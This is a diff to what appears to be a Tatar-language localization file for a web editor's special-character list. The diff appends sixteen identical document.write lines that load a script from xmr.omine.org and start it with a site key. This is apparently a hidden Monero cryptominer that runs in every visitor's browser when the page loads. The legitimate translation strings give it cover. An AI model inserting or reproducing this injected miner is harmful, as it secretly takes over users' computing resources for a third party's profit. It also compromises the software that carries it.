@@ -11,3 +11,19 @@ ccedil:"Седиль белән латин c юл хәрефе",egrave:"Грав
 ocirc:"Циркумфлекс белән латин o юл хәрефе",otilde:"Тильда белән латин o юл хәрефе",ouml:"Диерезис белән латин o юл хәрефе",divide:"Бүлү билгесе",oslash:"Сызык белән латин o юл хәрефе",ugrave:"Гравис белән латин u юл хәрефе",uacute:"Басым билгесе белән латин u юл хәрефе",ucirc:"Циркумфлекс белән латин u юл хәрефе",uuml:"Диерезис белән латин u юл хәрефе",yacute:"Басым билгесе белән латин y юл хәрефе",thorn:"Латин thorn юл хәрефе",yuml:"Диерезис белән латин y юл хәрефе",OElig:"Латин лигатура OE баш хәрефе",
 oelig:"Латин лигатура oe юл хәрефе",372:"Циркумфлекс белән латин W баш хәрефе",374:"Циркумфлекс белән латин Y баш хәрефе",373:"Циркумфлекс белән латин w юл хәрефе",375:"Циркумфлекс белән латин y юл хәрефе",sbquo:"Single low-9 quotation mark",8219:"Single high-reversed-9 quotation mark",bdquo:"Double low-9 quotation mark",hellip:"Ятма эллипс",trade:"Сәүдә маркасы билгесе",9658:"Black right-pointing pointer",bull:"Маркер",rarr:"Уң якка ук",rArr:"Уң якка икеләтә ук",hArr:"Ике якка икеләтә ук",diams:"Black diamond suit",
 asymp:"якынча"});
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
